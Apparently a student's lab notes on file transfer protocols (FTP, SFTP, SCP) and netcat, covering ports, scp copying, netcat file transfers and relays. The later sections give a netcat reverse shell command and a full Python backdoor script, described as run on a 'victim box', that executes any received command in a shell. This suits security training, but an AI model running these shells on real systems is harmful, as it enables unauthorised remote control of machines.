# Day 6 - File Transfer and Redirection

[TOC]

## TFTP

- UDP port 69
- Unsecure - No encryption

## FTP

- TCP port 21
- Port 20 for data connections
- Active/Passive
  - Passive: Client initiates both control and data connections
  - Active: FTP client initiates the control but server initiates the data connections

## FTPS

- TCP port 990 or 21
- Uses SSL/TLS for encryption

## SFTP

- Unique protocol, not to be confused with FTP. 
- TCP port 22

## SCP

- TCP port 22
- Symmetric and asymmetric encryption 

### Remote to Local

```bash
scp student@172.16.82.106:/home/student/secretstuff.txt /home/student
# File and then destination directory on local machine 
```

![image-20251124091330765](Images/image-20251124091330765.png)

### Local to Remote

```bash
scp secretstuff.txt student@172.16.82.106:/home/student
# Sending file from local machine to remote in /home/student
```

![image-20251124091428946](Images/image-20251124091428946.png)

### Remote to Remote

```bash
scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
# You are in the middle here. 
```

![image-20251124091734815](Images/image-20251124091734815.png)

## Netcat

Tool that allows for connections between two computers and allows data to be written over TCP or UDP. 

- File transfers
- Banner grabbing
- Port scanning
- Chat server

### Server Socket

Binds a port to listening for a connection 

```bash
nc -lvp 1111
```

### Client Socket

Creates a connection to a listening server socket

```bash
nc 10.10.0.40 1111
```

![image-20251124093627383](Images/image-20251124093627383.png)

### Transferring files

```bash
#One one side
nc 172.16.82.106 8888 < gpa.txt

#Receiving 
nc -lvp 8888 > transcript.txt

# Will move data from gpa.txt into transcript.txt
```

![image-20251124094746587](Images/image-20251124094746587.png)

### Transferring Files - Relay

```bash
# Step 1 - The Middle Man (Relay) - Setup two listening ports with a pipe (|) inbetween 
nc -lvnp 1111 < mypipe | nc -lvnp 3333 > mypipe

# Step 2 - Initiate file transfer - Send a nc connection with the file to the relay
nc 172.16.82.106 1111 < test.txt

# Step 3 - Recieve the file - Send a nc connection to the second half of the relay
nc 172.16.82.106 3333 > newtest.txt

# Note the changes within the ports during Step 2 and 3

```

![image-20251124100112519](Images/image-20251124100112519.png)

### Netcat Reverse Shell

A reverse shell is a type of shell where the target machine initiates the connection to the attacker's machine.

```bash
nc -lvp 9999 # On your box

nc -e /bin/bash 10.10.0.40 9999 # Run on the box we want a shell on. This connects to the listener we setup
```

![image-20251124100440975](Images/image-20251124100440975.png)



### Python3 Backdoor

Nifty script to run on a victim to get a reverse shell. 

```python
#Run this on the victim box

#!/usr/bin/python3
import socket
import subprocess
PORT = 1234        # Choose an unused port!
print ("Waiting for Remote connections on port:", PORT, "\n")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', PORT))
server.listen()
while True:
    conn, addr = server.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = proc.communicate()
            response = output.decode() + err.decode()
            conn.sendall(response.encode())
server.close()
```

```bash
# Still on the victim box
chmod +x backdoor.py # Make execuable 
./backdoor.py # Run the program
```

```bash
nc 10.10.0.40 1234 # Run on your host
```



## Hex Encoding - xxd

The xxd linux command creates a hex dump of a given file or input. It can also convert a hex dump back to its original binary form.

```
echo "Hex encoding test" | xxd -p
```

![image-20251124100751025](Images/image-20251124100751025.png)
